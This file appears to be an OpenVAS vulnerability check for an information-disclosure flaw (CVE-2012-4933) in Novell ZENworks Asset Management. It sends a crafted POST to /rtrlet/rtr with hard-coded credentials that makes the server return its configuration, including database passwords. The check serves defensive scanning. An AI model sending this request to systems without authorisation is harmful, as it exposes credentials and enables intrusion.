###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_novell_zenworks_asset_mangment_info_disc_vuln.nasl 10021 2018-05-30 09:03:08Z cfischer $
#
# Novell ZENWorks Asset Management Information Disclosure Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902928");
  script_version("$Revision: 10021 $");
  script_cve_id("CVE-2012-4933");
  script_bugtraq_id(55933);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-05-30 11:03:08 +0200 (Wed, 30 May 2018) $");
  script_tag(name:"creation_date", value:"2012-10-26 12:25:31 +0530 (Fri, 26 Oct 2012)");
  script_name("Novell ZENWorks Asset Management Information Disclosure Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/50967/");
  script_xref(name : "URL" , value : "http://securitytracker.com/id?1027682");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/332412");
  script_xref(name : "URL" , value : "https://community.rapid7.com/community/metasploit/blog/2012/10/15/cve-2012-4933-novell-zenworks");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to obtain
  sensitive information via a crafted rtrlet/rtr request for the
  HandleMaintenanceCalls function.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Novell ZENworks Asset Management version 7.5");
  script_tag(name : "insight" , value : "The 'GetFile_Password()' and 'GetConfigInfo_Password()' method
  within the rtrlet component contains hard coded credentials and can be
  exploited to gain access to the configuration file and download arbitrary
  files by specifying an absolute path.");
  script_tag(name : "solution" , value : "Apply the patch from the below link or update to latest version,

  For patch refer to http://download.novell.com/Download?buildid=yse-osBjxeo~

  For updates refer to http://www.novell.com/products/zenworks/assetmanagement");
  script_tag(name : "summary" , value : "This host is running Novell ZENWorks Asset Management and is
  prone to information disclosure vulnerabilities.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:8080 );
host = http_host_name( port:port );

data = "kb=&file=&absolute=&maintenance=GetConfigInfo_password&username" +
       "=Ivanhoe&password=Scott&send=Submit";

req = string("POST /rtrlet/rtr HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(data), "\r\n\r\n",
             data);
res = http_keepalive_send_recv(port:port, data:req);

if(res && "Rtrlet Servlet Configuration Parameters" >< res &&
   "DBName" >< res && "DBUser" >< res && "ZENWorks" >< res &&
   "DBPassword" >< res){
  security_message(port:port);
  exit(0);
}

exit(99);
